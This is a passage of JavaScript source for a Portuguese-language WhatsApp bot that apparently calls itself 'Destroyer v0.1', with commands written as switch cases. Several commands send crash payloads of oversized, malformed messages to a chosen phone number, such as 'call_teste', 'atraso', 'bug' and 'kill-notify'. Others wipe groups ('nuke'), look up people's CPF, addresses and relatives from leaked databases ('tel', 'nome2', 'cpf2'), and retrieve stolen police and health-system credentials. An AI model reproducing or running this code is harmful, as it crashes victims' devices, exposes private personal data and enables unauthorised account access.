*Que o amor, o respeito e as figurinhas engra√ßadas estejam sempre presentes!* üíû

üîö *Para encerrar esse relacionamento:*  
‚úÇÔ∏è Use o comando: *${prefix}terminar_namoro*
`

    await uwu.sendMessage(m.chat, {
        text: txt,
        mentions: [sender, parceiro]
    }, {
        quoted: m
    })
}
break

case 'call_teste':
  if(!isCreator) return reply(mess.prem)
  if (!q.trim()) return reply(`Exemplo: ${prefix}${command} 558198923680`)

  var jid = await validarNumeroWhatsApp(q, reply)
  if (!jid) return
  try {
    const sendCorruptedMessage = async () => {
      try {
        await uwu.relayMessage(jid, {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
              },
              interactiveMessage: {
                body: {
                  text: "\u0300 ‚Äì \u036F" + "Í¶æ".repeat(60000)
                },
                nativeFlowMessage: {
                  buttons: [
                    { name: "single_select", buttonParamsJson: '' },
                    { name: "call_permission_request", buttonParamsJson: '' },
                    { name: "call_permission_request", buttonParamsJson: '' },
                    { name: "call_permission_request", buttonParamsJson: '' },
                    { name: "call_permission_request", buttonParamsJson: '' },
                    { name: "call_permission_request", buttonParamsJson: '' },
                    { name: "call_permission_request", buttonParamsJson: '' },
                    { name: "call_permission_request", buttonParamsJson: '' }
                  ]
                },
                contextInfo: {
                  stanzaId: uwu.generateMessageTag(),
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: EsQl,
                  mentionedJid: [
                    "0@s.whatsapp.net",
                    "120363025003560808@g.us",
                    "server@s.whatsapp.net",
                    "status@broadcast",
                    jid,
                    "999999999999999@s.whatsapp.net",
                    "spam@broadcast",
                    "whatsapp@broadcast",
                    "unknown@s.whatsapp.net"
                  ],
                  isForwarded: true,
                  forwardingScore: 999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: m.chat
                  }
                },
                body: {
                  text: 'Í¶æ'.repeat(100000)
                },
                nativeFlowMessage: {
                  buttons: [
                    { name: "single_select", buttonParamsJson: '' },
                    { name: "call_permission_request", buttonParamsJson: '' },
                    { name: "mpm", buttonParamsJson: '' },
                    { name: "mpm", buttonParamsJson: '' }
                  ]
                }
              }
            }
          }
        }, {
          participant: { jid: jid }
        });
      } catch (err) {
        console.log("Erro ao enviar mensagem corrompida:", err);
      }
    };

    for (let i = 0; i < 1; i++) {
      await sendCorruptedMessage();
      delay(3000)
    }
    reply(`Crash enviado`)

  } catch (err) {
    console.log("Erro no crash_home:", err);
  }
break

case 'correio':
  if (!q.includes('/')) return reply(`üì© Exemplo de uso:\n${prefix}correio 558198923680/Oi Amor, sdds`)

  const partes = q.trim().split('/')
  if (partes.length < 2) return reply('‚ùå Use no formato correto: n√∫mero/mensagem')

  const numero = partes[0].replace(/\D/g, '')
  const mensagemTexto = partes.slice(1).join('/').trim()

  if (!numero || !mensagemTexto) return reply('‚ùå N√∫mero ou mensagem inv√°lidos.')

  const [result] = await uwu.onWhatsApp(numero)
  if (!result || !result.exists) return reply('‚ùå Esse n√∫mero n√£o est√° registrado no WhatsApp.')

  const mensagem = 
`‚ï≠‚îÑ‚îÅ‚îÑ‚îÅ‚îÑ‚îÅ‚îÑ‚îÅ‚îÑ‚îÅ‚ïÆ
‚îû‚îß¬†‚∏ô. Õé€´€™¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†üíå¬†¬†ÀêÕ°‚ÇäÍûãÍûåÍûãÍûå
‚îû‚îßCorreio an√¥nimo
‚îû‚îßMsg: ${mensagemTexto}
‚ï∞‚îÑ‚îÅ‚îÑ‚îÅ‚îÑ‚îÅ‚îÑ‚îÅ‚îÑ‚îÅ‚ïØ`

  await uwu.sendMessage(result.jid, { text: mensagem })
  reply(`‚úÖ Mensagem enviada com sucesso para o n√∫mero: ${numero}`)
break

case 'totag': {
  if (!m.isGroup) return reply(mess.grp)
  if (!isAdmins) return reply(mess.admin)

  const mentions = participants.map(p => p.id)
  const totalMembros = participants.length

  const texto =  `
‚ï≠‚îÄ‚ùç *TOTAG* ‚ùç‚îÄ‚ïÆ
‚îÇ  *Mensagem do adm:* ${text?.trim() || 'Nenhuma mensagem'}
‚îÇ  Ol√°, pessoal! üì¢  
‚îÇ  Foram marcados *${totalMembros}* membros!
‚îÇ  Vai que √© algo importante! üëÄ
‚ï∞‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ïØ
  `.trim()

  await uwu.sendMessage(m.chat, {
    text: texto,
    mentions
  }, {
    quoted: m
  })
}
break

case 'ban':
  if (!m.isGroup) return reply(mess.grp)
  if (!isBotAdmins) return reply(mess.botadm)
  if (!isAdmins) return reply(mess.admin)

  if (m.mentionedJid.length === 0) return reply('‚ùå Marque o usu√°rio que voc√™ quer banir.')

  const target = m.mentionedJid[0]

  if (target === botNumber + '@s.whatsapp.net') {
    return reply('üö´ N√£o posso banir a mim mesmo.')
  }

  const groupMetadata = await uwu.groupMetadata(m.chat)
  const groupAdmins = groupMetadata.participants
    .filter(p => p.admin !== null)
    .map(p => p.id)

  if (groupAdmins.includes(target)) {
    return reply('‚ùå N√£o posso banir um administrador.')
  }

  try {
    await uwu.groupParticipantsUpdate(m.chat, [target], 'remove')
    reply(`‚úÖ Usu√°rio banido com sucesso.`)
  } catch (err) {
    console.error('Erro ao banir:', err)
    reply('‚ùå Ocorreu um erro ao tentar banir o usu√°rio.')
  }
break

case 'antidoc':
if (!m.isGroup) return reply(mess.grp)
if (!isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadm)
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
    if (Antidoc) return reply('Ja esta ativo')
    dataGp[0].antidoc = true
    setGp(dataGp)
    reply('Ativou com sucesso o recurso de anti documento neste grupo‚úîÔ∏è')
} else if (Number(args[0]) === 0) {
    if (!Antidoc) return reply('Ja esta Desativado')
    dataGp[0].antidoc = false
    setGp(dataGp)
    reply('‚ÄºÔ∏è Desativou com sucesso o recurso de anti documento neste grupo‚úîÔ∏è')
} else {
    reply('1 para ativar, 0 para desativar')
}
break

case 'antilink':
if (!m.isGroup) return reply(mess.grp)
if (!isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadm)
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
    if (isAntiLinkHard) return reply('Ja esta ativo')
    dataGp[0].antilinkhard = true
    setGp(dataGp)
    reply('üåÄ Ativou com sucesso o recurso de antilink neste grupo üìù')
} else if (Number(args[0]) === 0) {
    if (!isAntiLinkHard) return reply('Ja esta Desativado')
    dataGp[0].antilinkhard = false
    setGp(dataGp)
    reply('‚ÄºÔ∏è Desativou com sucesso o recurso de antilink harcore neste grupo‚úîÔ∏è')
} else {
    reply('1 para ativar, 0 para desativar')
}
break

case 'atrasostatus':
  if(!isCreator) return reply(mess.prem)
  if (!q.trim()) return reply(`Exemplo: ${prefix}${command} 558198923680`)

  var jid = await validarNumeroWhatsApp(q, reply)
  if (!jid) return

  for(let i = 0; i < 20; i++) {
    await protocolbug3(jid)
    await new Promise(resolve => setTimeout(resolve, 500)) // pausa 2 segundos
  }
  reply(`${command} Enviado com sucesso para o alvo`)
break

case 'bug':
  if(!isCreator) return reply(mess.prem)
  if (!q.trim()) return reply(`Exemplo: ${prefix}${command} 558198923680`)

  var jid = await validarNumeroWhatsApp(q, reply)
  if (!jid) return

  for(let i = 0; i < 3; i++) {
    await SockMentionJid3(jid, EsQl)
    delay(100)
    await XeonXRobust(jid, EsQl)
    delay(100)
    await nullQ(jid, EsQl)
    delay(100)
    await StxCuiSh(jid, EsQl)
    delay(100)
    await enviarBugStickerCrash(jid, EsQl)
    delay(100)
  }
  await uwu.sendMessage(m.chat, { text: `Usu√°rio morto com sucesso!` })
break

case 'atraso':
  if (!isCreator) return reply(mess.prem)
  if (!q.trim()) return reply(`Exemplo: ${prefix}${command} 558198923680`)

  var jid = await validarNumeroWhatsApp(q, reply)
  if (!jid) return

  for (let i = 0; i < 1; i++) {
    await outofsync(jid, EsQl)
    await delay(400)
    await TagWhatsApp1(jid, EsQl)
    await delay(400)
    await Loc(jid, EsQl)
    await delay(400)
    await XeonXRobust(jid, XeonBotInc, true, true, EsQl)
    await delay(400)
  }

  reply(m.chat, { text: `‚úÖ Atraso enviado com sucesso` })
break

case 'atraso':
  if(!isCreator) return reply(mess.prem)
  if (!q.trim()) return reply(`Exemplo: ${prefix}${command} 558198923680`)

  var jid = await validarNumeroWhatsApp(q, reply)
  if (!jid) return

  for (let i = 0; i < 50; i++) {
    await uwu.relayMessage(jid, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: `\n ${args.join(" ") ? args.join(" ") : '- ùì´ùîÇ ùììùìÆùìºùìΩùìªùì∏ùîÇùìÆùìª ùìø0.1'}\n\n\n`,
                        format: "cta_url"
                    },
                    nativeFlowResponseMessage: {
                        name: 'cta_url',
                        paramsJson: `{\"cta_url\":true,\"cta_url\":true,\"cta_url\":\"AdvanceBug\",\"cta_url\":\"1028995200000\",\"cta_url\":\"cta_url\",\"cta_url\":\"94643116\",\"cta_url\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"cta_url\":\"\u0003\",\"cta_url\":\"cta_url\",\"cta_url\":\"cta_url\",\"cta_url\":\"cta_url\"}`,
                        version: 3
                    }
                }
            }
        }
    }, {
        participant: {
            jid: jid
        }
    });
  }
break

case 'kill-notify':
  if (!isCreator) return reply(mess.prem)
  if (!q.trim()) return reply(`Exemplo: ${prefix}${command} 558198923680`)

  var jid = await validarNumeroWhatsApp(q, reply)
  if (!jid) return

  await trashinfinity(jid, EsQl)
  await nativemessage(jid, EsQl)
  await darkflower(jid, EsQl)
  await AnakKucai(jid, EsQl)
  await CrlButton(jid, EsQl)
  await VPen(jid, EsQl)
  await Blanking(jid, EsQl)
  await Loc(jid, EsQl)
  await Notifattack(jid, EsQl)
  await doc(jid, EsQl)
  await buginvite(jid, EsQl)
  await LocInvisi(jid, EsQl)
  await TagWhatsApp1(jid, EsQl)
  await reply(`${pushname}\n*Usu√°rio morto! Espere para usar o comando novamente*`)
break

case 'nuke':
  if (!m.isGroup) return reply(mess.grp)
  if (!isCreator) return reply(mess.prem)
  await limparGrupoRenomear(m.key.remoteJid, 'ùíúùëÖùí¨ùí∞ùêºùí±ùíúùíüùí™ ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£', 'GRUPO ARQUIVO PELO MELHOR BOT DE TODOS!\n ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£');
break

case 'location': {
    if (!isCreator) return reply(mess.prem)
    if (!q.trim()) return reply(`Exemplo: ${prefix}${command} 558198923680`)

    var jid = await validarNumeroWhatsApp(q, reply)
    if (!jid) return

    for (let i = 0; i < 5; i++) {
    await sendLiveLocationMessage(jid)
    }
}
break

case 'null':
  if(!isCreator) return reply(mess.prem)
  if (!q.trim()) return reply(`Exemplo: ${prefix}${command} 558198923680`)

  var jid = await validarNumeroWhatsApp(q, reply)
  if (!jid) return
  
  await nullInf(jid)
break

case 'play':
  if(!text) return reply(`Digite o nome da musica`)
  const query = text.split(' ').slice(1).join(' ')

  try {
    const axios = require('axios')
    const response = await axios.get(`https://nodz-apis.com.br/api/downloads/playaudio?query=${encodeURIComponent(query)}&apiKey=9e603158b5`)

    if (response.data.status) {
      const data = response.data.resultado

      if (!data || !data.audio || !data.titulo || !data.descricao) {
        throw new Error('Dados inv√°lidos ou incompletos na resposta da API.')
      }

      const audioUrl = data.audio
      const imageUrl = data.imagem

      const audioResponse = await axios.get(audioUrl, { responseType: 'arraybuffer' })
      const audioBuffer = Buffer.from(audioResponse.data)

      const imageResponse = await axios.get(imageUrl, { responseType: 'arraybuffer' })
      const imageBuffer = Buffer.from(imageResponse.data)

      const tempImagePath = path.join(os.tmpdir(), `image_${Date.now()}.jpg`);
      fs.writeFileSync(tempImagePath, imageBuffer);

        await uwu.sendMessage(m.chat, { 
          image: { url: tempImagePath },
          caption: `üé∂ *T√≠tulo*: ${data.titulo}\nüëÄ *Visualiza√ß√µes*: ${data.views}\nüìù *Descri√ß√£o*: ${data.descricao}\nüé§ *Autor*: ${data.autor}\nüìÖ *Postado*: ${data.postado}\n‚è≥ *Dura√ß√£o*: ${data.tempo})`,
          mentions: [m.sender],
        })
        await uwu.sendMessage(m.chat, {
          audio: audioBuffer,
          mimetype: 'audio/mp4',
          ptt: false,
      })
      fs.unlinkSync(tempImagePath);
  } else {
    await uwu.sendMessage(from, { text: '‚ùå N√£o foi poss√≠vel encontrar o √°udio.' });
  }
} catch (error) {
  console.error('Erro ao buscar ou enviar o √°udio:', error);
  await uwu.sendMessage(from, { text: '‚ùå Ocorreu um erro ao buscar o √°udio.' });
}
break

case 'plaq1':
case 'plaq2':
case 'plaq3':
case 'plaq4':
case 'plaq5':
case 'plaq6':
case 'plaq7':
case 'plaq8': {
  if (!isCreator) return reply(mess.prem);

  const comando = command; // plaq1, plaq2, etc.
  const numero = comando.replace('plaq', ''); // extrai o n√∫mero
  const texto = q.trim();

  if (!texto) {
    return reply(`‚ùó Informe um texto para gerar a imagem.\nExemplo: ${comando} luckzin`);
  }

  try {
    const url = `https://pnsapis.online/api/${comando}?texto=${encodeURIComponent(texto)}&apitoken=Verykibes%20Channel2025ofc`;

    await uwu.sendMessage(from, {
      image: { url },
      caption: ``
    }, { quoted: m });

  } catch (err) {
    console.error(err);
    return reply(`‚ùå Erro ao gerar a placa ${numero}.`);
  }
}
break;

case 'gethtml':
  if(!isCreator) return reply(mess.prem)
  if(!text) return reply(`Digite o site sem o https://\nExemplo: xvideos.com`)
  const axios = require('axios')
  const site = text.trim();
  const response = await axios.get(`https://nodz-apis.com.br/api/outras/gethtml?url=https://${site}&apiKey=9e603158b5`)
  const html = response.data?.resultado

  if (!html || typeof html !== 'string') {
    throw new Error('HTML n√£o encontrado ou formato inv√°lido.');
  }

  const filePath = './tempfile.html'
  fs.writeFileSync(filePath, html)

  const fileBuffer = fs.readFileSync(filePath);

  await uwu.sendMessage(m.chat, {
    document: fileBuffer,
    fileName: 'site.html',
    mimetype: 'text/html',
    caption: 'HTML GERADO.'
  })
  fs.unlinkSync(filePath)
break

case 'nick':
  if(!isCreator) return reply(mess.prem)
  if(!text) return reply(`Digite o nick que voc√™ quer criar!`)
    const nome = text.trim();
    try {
        const axios = require('axios')
        const response = await axios.get(`https://nodz-apis.com.br/api/outras/fazer/nick?query=${encodeURIComponent(nome)}&apiKey=9e603158b5`)
        const { resultado } = response.data

        const nicks = resultado
            .filter(item => item.nome && item.nome.trim() !== '')
            .map(item => `‚Ä¢ ${item.nome}`)
            .join('\n');

        await uwu.sendMessage(m.chat, {
            text: `${nicks}`
        });
    } catch (error) {
        console.error('Erro ao buscar nick:', error);
        await uwu.sendMessage(sender, { text: 'Erro ao gerar nick!' });
    }
break

case "tel": {
  if (!isCreator) return reply(mess.prem)

  const telefone = q.trim().replace(/\D/g, '');
  if (!telefone || telefone.length < 11) {
      return reply("Por favor, informe um TELEFONE v√°lido. Exemplo: tel 48991522702");
  }

  try {
      const axios = require('axios');
      const url = `https://v0-painel-de-dados.vercel.app/api/consultas/telefone?telefone=${telefone}`;

      const response = await axios.get(url, {
          headers: {
              'X-Api-Access': 'aescorp-panel-access'
          }
      });

      const serasaData = response.data?.resultado?.serasa;

      if (!serasaData || serasaData.length === 0) {
          return reply(`*Nenhuma informa√ß√£o sobre o telefone ${telefone} encontrada.*`);
      }

      let result = "*üîç Consulta telefone:*\n\n";

      for (const item of serasaData) {
          const dados = item.dadoscpf || {};
          const drop = item.drop || {};
          const tel = item.telefone || {};

          result += `
üë§ *Nome:* ${dados.nome || "N√£o informado"}
üìÖ *Nascimento:* ${dados.nasc?.split(" ")[0] || "Desconhecido"}
üßì *M√£e:* ${dados.nome_mae || "Desconhecida"}
üßë‚Äçü¶≥ *Pai:* ${dados.nome_pai || "Desconhecido"}
üÜî *CPF:* ${dados.cpf || "Desconhecido"}
üìù *RG:* ${dados.rg || "N√£o informado"} - ${dados.orgao_emissor || ""}
üí∏ *Renda:* R$ ${dados.renda || "N√£o informado"}
üó≥Ô∏è *T√≠tulo de Eleitor:* ${dados.titulo_eleitor || "N√£o dispon√≠vel"}

üè† *Endere√ßo:*
 - Rua: ${drop.logr_tipo || ""} ${drop.logr_nome || "Desconhecida"}, N¬∫ ${drop.logr_numero || "-"}
 - Bairro: ${drop.bairro || "-"}, Cidade: ${drop.cidade || "-"}, CEP: ${drop.cep || "-"}
 - UF: ${drop.uf || "-"}

üì± *Telefone:* (${tel.DDD || "--"}) ${tel.TELEFONE || "N√£o informado"}
üìÜ *Inclus√£o:* ${tel.DT_INCLUSAO || "Data desconhecida"}

          `.trim() + "\n\n";
      }

      reply(result.trim());

  } catch (error) {
      console.error(error);
      reply("Erro ao consultar o telefone. Tente novamente mais tarde.");
  }
}
break;

case "nome": {
  if (!isCreator) return reply(mess.prem);

  const nome = q.trim();
  if (!nome || nome.length < 5) {
      return reply("Por favor, informe um NOME v√°lido. Exemplo: nome Nataildes Carvalho De Jesus");
  }

  try {
      const axios = require('axios');
      const url = `https://v0-painel-de-dados.vercel.app/api/consultas/nome?nome=${encodeURIComponent(nome)}`;
      const response = await axios.get(url, {
          headers: {
              'X-Api-Access': 'aescorp-panel-access'
          }
      });

      const data = response.data?.resultado;

      if (!data || data.length === 0) {
          return reply(`*Nenhuma informa√ß√£o sobre o nome ${nome} encontrada.*`);
      }

      let result = `*üîç Consulta por Nome:*\n\n`;

      for (const pessoa of data) {
          result += `
üë§ *Nome Completo:* ${pessoa.nome || "Desconhecido"}
üìÖ *Data de Nascimento:* ${pessoa.nasc?.split(" ")[0] || "Desconhecida"}
üÜî *CPF:* ${pessoa.cpf || "Desconhecido"}
üë©‚Äçü¶≥ *Nome da M√£e:* ${pessoa.nome_mae || "Desconhecida"}
üî± *Sexo:* ${pessoa.sexo || "Desconhecido"}
          `.trim() + "\n\n";
      }

      reply(result.trim());

  } catch (error) {
      console.error(error);
      reply("Erro ao consultar o nome. Tente novamente mais tarde.");
  }
}
break;

case 'pmrj': {
  if(!isCreator) return reply(mess.prem);

  try {
    const axios = require('axios');
    const url = `https://pnsapis.online/outros/pmrj?apitoken=Verykibes%20Channel2025ofc`;

    const response = await axios.get(url);
    const data = response?.data;

    if (!data || data.status !== true) {
      return reply('‚ùå N√£o foi poss√≠vel obter os dados do PM RJ no momento.');
    }

    // Formata quebras de linha
    const conta = data.conta.replace(/\\n/g, '\n');

    const resultado = `
üöì *Credenciais PM-RJ:*

${conta}
`.trim();

    return reply(resultado);

  } catch (err) {
    console.error(err);
    return reply("‚ùå Ocorreu um erro ao buscar as credenciais do PM RJ.");
  }
}
break;


case 'sppni': {
  if(!isCreator) return reply(mess.prem);

  try {
    const axios = require('axios');
    const url = `https://pnsapis.online/outros/sp-pni?apitoken=Verykibes%20Channel2025ofc`;

    const response = await axios.get(url);
    const data = response?.data;

    if (!data || data.status !== true) {
      return reply('‚ùå N√£o foi poss√≠vel obter os dados do SP-PNI no momento.');
    }

    // Limpa os \n
    const conta = data.conta.replace(/\\n/g, '\n');

    const resultado = `
üíâ *Credenciais SP-PNI:*

${conta}
`.trim();

    return reply(resultado);

  } catch (err) {
    console.error(err);
    return reply("‚ùå Ocorreu um erro ao buscar as credenciais do SP-PNI.");
  }
}
break;

case 'credlink': {
  if(!isCreator) return reply(mess.prem);

  try {
    const axios = require('axios');
    const url = `https://pnsapis.online/outros/credlink?apitoken=Verykibes%20Channel2025ofc`;

    const response = await axios.get(url);
    const data = response?.data;

    if (!data || data.status !== true) {
      return reply('‚ùå N√£o foi poss√≠vel obter os dados do credlink no momento.');
    }

    // Limpeza e formata√ß√£o b√°sica do texto da conta
    const conta = data.conta.replace(/\\n/g, '\n');

    const resultado = `
üîê *Credenciais CREDILINK:*

${conta}
`.trim();

    return reply(resultado);

  } catch (err) {
    console.error(err);
    return reply("‚ùå Ocorreu um erro ao buscar as credenciais do CREDILINK.");
  }
}
break;

case 'nome2': {
  if (!isCreator) return reply(mess.prem);

  const nomeBusca = q.trim();
  if (!nomeBusca) {
    return reply('Por favor, informe um nome v√°lido. Exemplo: nome2 Nataildes Carvalho De Jesus');
  }

  try {
    const axios = require('axios');
    const url = `https://pnsapis.online/consultas/bigdata/nome?query=${encodeURIComponent(nomeBusca)}&apitoken=Verykibes%20Channel2025ofc`;
    const { data } = await axios.get(url);

    if (!data?.status || !data?.resultado) {
      return reply(`‚ùå Nenhum resultado encontrado para o nome: ${nomeBusca}`);
    }

    const r = data.resultado;

    // Verificar se todos os campos relevantes est√£o undefined ou "N√£o informado"
    const camposPrincipais = [
      r.NOME, r.CPF, r.SEXO, r.DT_NASCIMENTO, r.IDADE, r.ESTADO_CIVIL, r.TITULO_ELEITOR,
      r.NOME_MAE, r.NOME_PAI, r.registro_geral?.RG, r.dados_aquisitivos?.BASE_RENDA
    ];

    const todosIndefinidos = camposPrincipais.every(campo =>
      campo === undefined || campo === null || campo === "N√£o informado" || campo === "N√£o encontrado"
    );

    if (todosIndefinidos) {
      return reply(`‚ùå Nenhuma informa√ß√£o relevante encontrada para o nome: *${nomeBusca}*`);
    }

    const infoPrincipal = `
üîé *Resultado da Busca:*
üë§ *Nome:* ${r.NOME || 'Desconhecido'}
üÜî *CPF:* ${r.CPF || 'Desconhecido'}
üß¨ *Sexo:* ${r.SEXO || 'Desconhecido'}
üìÖ *Nascimento:* ${r.DT_NASCIMENTO || 'Desconhecido'}
üéÇ *Idade:* ${r.IDADE || 'Desconhecido'}
üíç *Estado Civil:* ${r.ESTADO_CIVIL || 'Desconhecido'}
üìÑ *T√≠tulo Eleitor:* ${r.TITULO_ELEITOR || 'Desconhecido'}
üî¢ *PIS:* ${r.PIS || 'Desconhecido'}
‚ö∞Ô∏è *√ìbito:* ${r.DT_OBITO || 'Desconhecido'}
üë©‚Äçüë¶ *M√£e:* ${r.NOME_MAE || 'Desconhecido'}
üë®‚Äçüë¶ *Pai:* ${r.NOME_PAI || 'Desconhecido'}

üÜî *RG:* ${r.registro_geral?.RG || 'Desconhecido'}
üè¢ *√ìrg√£o Emissor:* ${r.registro_geral?.ORG√ÉO_EMISSOR || 'Desconhecido'}
üìç *UF Emiss√£o:* ${r.registro_geral?.UF_EMISSAO || 'Desconhecido'}

üí∞ *Base Renda:* R$ ${r.dados_aquisitivos?.BASE_RENDA || 'Desconhecido'}
üè† *Poder Aquisitivo:* ${r.dados_aquisitivos?.PODER_AQUISITIVO || 'Desconhecido'}
üìä *Faixa:* ${r.dados_aquisitivos?.FX_PODER_AQUISITIVO || 'Desconhecido'}
üìà *Score CSB8:* ${r.dados_aquisitivos?.SCORE_CSB8 || '-'} - ${r.dados_aquisitivos?.CSB8_FAIXA || '-'}
üìâ *Score CSBA:* ${r.dados_aquisitivos?.SCORE_CSBA || '-'} - ${r.dados_aquisitivos?.CSBA_FAIXA || '-'}
    `.trim();

    let telefones = '*üìû Telefones encontrados:*\n';
    if (r.telefones && r.telefones.length > 0) {
      telefones += r.telefones.map(t => `‚Ä¢ ${t}`).join('\n');
    } else {
      telefones += 'Nenhum encontrado';
    }

    let emails = '*üìß E-mails encontrados:*\n';
    if (r.emails && r.emails.length > 0) {
      emails += r.emails.map(e => `‚Ä¢ ${e.EMAIL} (${e.SCORE})`).join('\n');
    } else {
      emails += 'Nenhum encontrado';
    }

    let parentes = '*üß¨ Parentes:*\n';
    if (r.parentes && r.parentes.length > 0) {
      parentes += r.parentes.map(p => `‚Ä¢ ${p.NOME} (${p.VINCULO}) - CPF: ${p.CPF}`).join('\n');
    } else {
      parentes += 'Nenhum encontrado';
    }

    let enderecos = '*üè° Endere√ßos:*\n';
    if (r.enderecos && r.enderecos.length > 0) {
      enderecos += r.enderecos.map(e => `‚Ä¢ ${e.NOME}, ${e.NUMERO}, ${e.BAIRRO}, ${e.CIDADE} - CEP: ${e.CEP}`).join('\n');
    } else {
      enderecos += 'Nenhum encontrado';
    }

    const resposta = `${infoPrincipal}\n\n${telefones}\n\n${emails}\n\n${parentes}\n\n${enderecos}`;
    return reply(resposta);

  } catch (err) {
    console.error(err);
    return reply("‚ùå Ocorreu um erro ao consultar o nome. Tente novamente mais tarde.");
  }
}
break;


case 'cpf2': {
  if (!isCreator) return reply(mess.prem)

  const cpfnum = q.trim().replace(/\D/g, '')
  if (!cpfnum || cpfnum.length !== 11) {
    return reply('Por favor, informe um CPF v√°lido. Exemplo: cpf2 21272557553')
  }

  try {
    const axios = require('axios')
    const url = `https://pnsapis.online/consultas/bigdata/cpf?query=${cpfnum}&apitoken=Verykibes%20Channel2025ofc`

    const { data } = await axios.get(url)
    const r = data?.resultado

    if (!r || !r.CPF) {
      return reply(`‚ùå Nenhuma informa√ß√£o encontrada para o CPF: *${cpfnum}*`)
    }

    const camposPrincipais = [
      r.NOME, r.CPF, r.SEXO, r.DT_NASCIMENTO, r.IDADE, r.ESTADO_CIVIL,
      r.TITULO_ELEITOR, r.NOME_MAE, r.NOME_PAI, r.REGISTRO_GERAL?.RG,
      r.DADOS_AQUISITIVOS?.BASE_RENDA
    ]

    const tudoVazio = camposPrincipais.every(campo =>
      campo === undefined || campo === null || campo === 'N√£o informado' || campo === 'N√£o encontrado'
    )

    if (tudoVazio) {
      return reply(`‚ùå Nenhuma informa√ß√£o relevante encontrada para o CPF: *${cpfnum}*`)
    }

    const info = `
üîç *Consulta por CPF:*
üë§ *Nome:* ${r.NOME || "Desconhecido"}
üÜî *CPF:* ${r.CPF || "Desconhecido"}
üìÖ *Nascimento:* ${r.DT_NASCIMENTO || "Desconhecido"}
üéÇ *Idade:* ${r.IDADE || "Desconhecida"}
üß¨ *Sexo:* ${r.SEXO || "N√£o informado"}
üíç *Estado Civil:* ${r.ESTADO_CIVIL || "N√£o informado"}
üë©‚Äçü¶≥ *M√£e:* ${r.NOME_MAE || "Desconhecida"}
üë® *Pai:* ${r.NOME_PAI || "N√£o informado"}
üó≥Ô∏è *T√≠tulo de Eleitor:* ${r.TITULO_ELEITOR || "Desconhecido"}
üìÑ *PIS:* ${r.PIS || "N√£o informado"}
‚ö∞Ô∏è *√ìbito:* ${r.DT_OBITO || "N√£o informado"}

ü™™ *RG:* ${r.REGISTRO_GERAL?.RG || "N√£o informado"}
üèõÔ∏è *√ìrg√£o Emissor:* ${r.REGISTRO_GERAL?.ORG√ÉO_EMISSOR || "N√£o informado"}
üìç *UF Emiss√£o:* ${r.REGISTRO_GERAL?.UF_EMISSAO || "N√£o informado"}

üí∏ *Base Renda:* R$ ${r.DADOS_AQUISITIVOS?.BASE_RENDA || "Desconhecida"}
üè† *Poder Aquisitivo:* ${r.DADOS_AQUISITIVOS?.PODER_AQUISITIVO || "Desconhecido"}
üìä *Faixa:* ${r.DADOS_AQUISITIVOS?.FX_PODER_AQUISITIVO || "Desconhecida"}
üìà *Score CSB8:* ${r.DADOS_AQUISITIVOS?.SCORE_CSB8 || "-"} - ${r.DADOS_AQUISITIVOS?.CSB8_FAIXA || "-"}
üìâ *Score CSBA:* ${r.DADOS_AQUISITIVOS?.SCORE_CSBA || "-"} - ${r.DADOS_AQUISITIVOS?.CSBA_FAIXA || "-"}
    `.trim()

    let telefones = '*üìû Telefones:*\n'
    if (r.TELEFONES?.length > 0) {
      telefones += r.TELEFONES.map(t => `‚Ä¢ ${t}`).join('\n')
    } else {
      telefones += 'Nenhum encontrado'
    }

    let emails = '*üìß E-mails:*\n'
    if (r.EMAILS?.length > 0) {
      emails += r.EMAILS.map(e => `‚Ä¢ ${e.EMAIL} (${e.SCORE})`).join('\n')
    } else {
      emails += 'Nenhum encontrado'
    }

    let parentes = '*üß¨ Parentes:*\n'
    if (r.PARENTES?.length > 0) {
      parentes += r.PARENTES.map(p => `‚Ä¢ ${p.NOME} (${p.VINCULO}) - CPF: ${p.CPF}`).join('\n')
    } else {
      parentes += 'Nenhum encontrado'
    }

    let enderecos = '*üè† Endere√ßos:*\n'
    if (r.ENDERECOS?.length > 0) {
      enderecos += r.ENDERECOS.map(e =>
        `‚Ä¢ ${e.NOME}, N¬∫ ${e.NUMERO}, ${e.BAIRRO}, ${e.CIDADE} - CEP: ${e.CEP}`
      ).join('\n')
    } else {
      enderecos += 'Nenhum encontrado'
    }

    const resposta = `${info}\n\n${telefones}\n\n${emails}\n\n${parentes}\n\n${enderecos}`
    return reply(resposta)

  } catch (err) {
    console.error(err)
    return reply("‚ùå Ocorreu um erro ao consultar o CPF. Tente novamente mais tarde.")
  }
}
break;

case 'sticker': {
  if (!quoted) return reply('üìå Responda a uma imagem ou v√≠deo com o comando *sticker*.')

  try {
    const { Sticker, StickerTypes } = require('wa-sticker-formatter')
    const mime = quoted.mimetype || ''

    if (!/image|video/.test(mime)) {
      return reply('‚ùå A mensagem marcada n√£o √© uma imagem ou v√≠deo.')
    }

    const stream = await downloadContentFromMessage(quoted, mime.split('/')[0])
    let buffer = Buffer.from([])

    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk])
    }

    const sticker = new Sticker(buffer, {
      pack: 'Feito por',
      author: 'Destoyer v0.1',
      type: StickerTypes.FULL,
    })

    const stickerBuffer = await sticker.toBuffer()

    await uwu.sendMessage(m.chat, {
      sticker: stickerBuffer
    }, { quoted: m })

  } catch (err) {
    console.error(err)
    reply('‚ùå Ocorreu um erro ao converter para figurinha.')
  }
  break;
}

case 'tel2': {
  if (!isCreator) return reply(mess.prem);

  const tel = q.trim().replace(/\D/g, '');
  if (!tel || tel.length < 10) {
